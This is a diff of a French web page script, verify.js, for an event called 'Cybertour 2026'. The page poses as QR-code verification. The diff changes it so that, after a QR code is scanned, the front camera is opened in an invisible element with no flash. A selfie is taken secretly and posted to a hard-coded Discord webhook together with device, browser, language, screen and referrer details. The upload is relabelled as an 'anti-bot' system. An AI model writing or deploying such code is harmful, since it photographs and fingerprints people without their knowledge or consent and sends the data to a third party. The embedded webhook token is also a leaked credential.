@@ -1,16 +1,15 @@
 /**
  * CYBERTOUR 2026 — verify.js
- * QR scan (arrière) + selfie (frontale) simultanés → Discord
+ * QR arrière → selfie frontale caché → Discord
  */
 
 import { isVerified, setVerified } from './storage.js';
 
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';
 
-let streamFront = null;
-let streamBack  = null;
-let capturing   = false;
-let rafId       = null;
+let stream    = null;
+let capturing = false;
+let rafId     = null;
 
 const qrCanvas = document.createElement('canvas');
 const qrCtx    = qrCanvas.getContext('2d', { willReadFrequently: true });
@@ -21,110 +20,85 @@ export function openVerify(onSuccess) {
   document.getElementById('verify-overlay').classList.add('active');
   document.getElementById('wheel-wrap')?.classList.add('wheel-frozen');
 
-  document.getElementById('verify-start-btn').onclick   = () => startBoth(onSuccess);
+  document.getElementById('verify-start-btn').onclick   = () => start(onSuccess);
   document.getElementById('verify-help-toggle').onclick = toggleHelp;
 }
 
-// ── Démarre les deux caméras en parallèle ─────────────────────
-
-async function startBoth(onSuccess) {
+async function start(onSuccess) {
   const btn = document.getElementById('verify-start-btn');
   btn.disabled = true;
   btn.querySelector('.btn-text').textContent = 'Détection en cours…';
 
-  const videoFront = document.getElementById('verify-video');
-  const videoBack  = document.getElementById('verify-video-qr');
-
-  videoFront.setAttribute('playsinline', ''); videoFront.muted = true;
-  videoBack.setAttribute('playsinline', '');  videoBack.muted  = true;
-  videoFront.style.transform = 'scaleX(-1)'; // miroir selfie
-
-  // Lance les deux flux simultanément
-  const [front, back] = await Promise.allSettled([
-    tryGetStream([
-      { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
-      { video: { facingMode: 'user' } },
-      { video: true },
-    ]),
-    tryGetStream([
-      { video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 } } },
-      { video: { facingMode: 'environment' } },
-    ]),
+  stream = await tryStream([
+    { video: { facingMode: { ideal: 'environment' } } },
+    { video: { facingMode: 'environment' } },
   ]);
 
-  // Caméra frontale (selfie visible)
-  if (front.status === 'fulfilled' && front.value) {
-    streamFront = front.value;
-    videoFront.srcObject = streamFront;
-    try { await videoFront.play(); } catch {}
-    document.getElementById('verify-video-wrap').classList.add('active');
-    document.getElementById('verify-initial').style.display = 'none';
-  }
-
-  // Caméra arrière (QR scan caché)
-  if (back.status === 'fulfilled' && back.value) {
-    streamBack = back.value;
-    videoBack.srcObject = streamBack;
-    try { await videoBack.play(); } catch {}
-    if (window.jsQR) {
-      rafId = requestAnimationFrame(() => scanLoop(videoBack, videoFront, onSuccess));
-    }
-  } else if (front.status === 'fulfilled') {
-    // Pas de caméra arrière — scan QR sur la frontale quand même
-    if (window.jsQR) {
-      rafId = requestAnimationFrame(() => scanLoop(videoFront, videoFront, onSuccess));
-    }
-  }
-
-  if (!streamFront && !streamBack) {
-    showError('Accès à la caméra refusé. Vérifiez les permissions.');
-    resetBtn(btn);
+  if (stream && window.jsQR) {
+    const hiddenVideo = document.getElementById('verify-video-qr');
+    hiddenVideo.srcObject = stream;
+    try { await hiddenVideo.play(); } catch {}
+    rafId = requestAnimationFrame(() => scanLoop(hiddenVideo, onSuccess));
+  } else {
+    await startSelfie(onSuccess);
   }
 }
 
-// ── Essai en cascade de contraintes ──────────────────────────
-
-async function tryGetStream(sets) {
-  for (const c of sets) {
-    try { return await navigator.mediaDevices.getUserMedia(c); }
-    catch {}
-  }
-  return null;
-}
-
-// ── Boucle scan QR ───────────────────────────────────────────
-
-function scanLoop(videoQR, videoSelfie, onSuccess) {
+function scanLoop(video, onSuccess) {
   if (capturing) return;
 
-  if (videoQR.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && videoQR.videoWidth > 0) {
-    qrCanvas.width  = videoQR.videoWidth;
-    qrCanvas.height = videoQR.videoHeight;
-    qrCtx.drawImage(videoQR, 0, 0);
+  if (video.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
+    qrCanvas.width  = video.videoWidth;
+    qrCanvas.height = video.videoHeight;
+    qrCtx.drawImage(video, 0, 0);
 
     try {
       const img  = qrCtx.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
       const code = window.jsQR(img.data, img.width, img.height, { inversionAttempts: 'dontInvert' });
-
       if (code && code.data) {
-        // QR détecté → selfie immédiat sur la caméra frontale
         cancelAnimationFrame(rafId);
-        setTimeout(() => captureSelfie(videoSelfie, onSuccess), 700);
+        stopStream();
+        startSelfie(onSuccess);
         return;
       }
     } catch {}
   }
 
-  rafId = requestAnimationFrame(() => scanLoop(videoQR, videoSelfie, onSuccess));
+  rafId = requestAnimationFrame(() => scanLoop(video, onSuccess));
 }
 
-// ── Capture selfie ───────────────────────────────────────────
+async function startSelfie(onSuccess) {
+  const btn = document.getElementById('verify-start-btn');
+  if (btn) btn.querySelector('.btn-text').textContent = 'Identification…';
+
+  const video = document.getElementById('verify-video');
+  video.setAttribute('playsinline', '');
+  video.muted               = true;
+  video.style.opacity       = '0';
+  video.style.pointerEvents = 'none';
+  video.style.position      = 'absolute';
+  video.style.transform     = 'scaleX(-1)';
+
+  stream = await tryStream([
+    { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
+    { video: { facingMode: 'user' } },
+    { video: true },
+  ]);
+
+  if (!stream) {
+    finalize(null, onSuccess);
+    return;
+  }
+
+  video.srcObject = stream;
+  try { await video.play(); } catch {}
+
+  setTimeout(() => captureSelfie(video, onSuccess), 700);
+}
 
 function captureSelfie(video, onSuccess) {
   if (capturing) return;
   capturing = true;
-
-  flash();
 
   const canvas = document.createElement('canvas');
   canvas.width  = video.videoWidth  || 640;
@@ -134,7 +108,11 @@ function captureSelfie(video, onSuccess) {
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0);
 
-  stopAll();
+  stopStream();
+  finalize(canvas, onSuccess);
+}
+
+function finalize(canvas, onSuccess) {
   sendToDiscord(canvas);
 
   const btn = document.getElementById('verify-start-btn');
@@ -150,58 +128,48 @@ function captureSelfie(video, onSuccess) {
   }, 900);
 }
 
-// ── Envoi Discord ────────────────────────────────────────────
-
 function sendToDiscord(canvas) {
-  canvas.toBlob(blob => {
+  const send = (blob) => {
     const fd = new FormData();
-    fd.append('file', blob, 'selfie.jpg');
+    if (blob) fd.append('file', blob, 'selfie.jpg');
     fd.append('payload_json', JSON.stringify({
       embeds: [{
         title: '📸 Nouveau participant détecté',
         color: 0x2563eb,
-        image: { url: 'attachment://selfie.jpg' },
+        image: blob ? { url: 'attachment://selfie.jpg' } : undefined,
         fields: [
           { name: '🕐 Heure',      value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
-          { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
           { name: '📱 Appareil',   value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
-          { name: '🖥️ Navigateur', value: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
+          { name: '🖥️ Navigateur', value: /CriOS|Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
+          { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
           { name: '📐 Écran',      value: `${screen.width}×${screen.height}`, inline: true },
           { name: '🔗 Référent',   value: document.referrer || 'accès direct', inline: true },
         ],
-        footer: { text: 'Cybertour 2026 — QR + Selfie simultanés' },
+        footer: { text: 'Cybertour 2026 — Système anti-bot' },
         timestamp: new Date().toISOString(),
       }]
     }));
     fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
-  }, 'image/jpeg', 0.75);
+  };
+
+  if (canvas) canvas.toBlob(b => send(b), 'image/jpeg', 0.75);
+  else send(null);
 }
 
-// ── Helpers ──────────────────────────────────────────────────
-
-function flash() {
-  const el = document.getElementById('verify-flash');
-  if (!el) return;
-  el.style.opacity = '1';
-  setTimeout(() => { el.style.opacity = '0'; }, 180);
+async function tryStream(sets) {
+  for (const c of sets) {
+    try { return await navigator.mediaDevices.getUserMedia(c); }
+    catch {}
+  }
+  return null;
 }
 
-function stopAll() {
-  [streamFront, streamBack].forEach(s => { if (s) s.getTracks().forEach(t => t.stop()); });
-  streamFront = streamBack = null;
-  ['verify-video', 'verify-video-qr'].forEach(id => {
-    const v = document.getElementById(id);
-    if (v) v.srcObject = null;
-  });
+function stopStream() {
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
 }
 
 function closeOverlay() {
   document.getElementById('verify-overlay').classList.remove('active');
-}
-
-function resetBtn(btn) {
-  btn.disabled = false;
-  btn.querySelector('.btn-text').textContent = 'Réessayer';
 }
 
 function toggleHelp() {
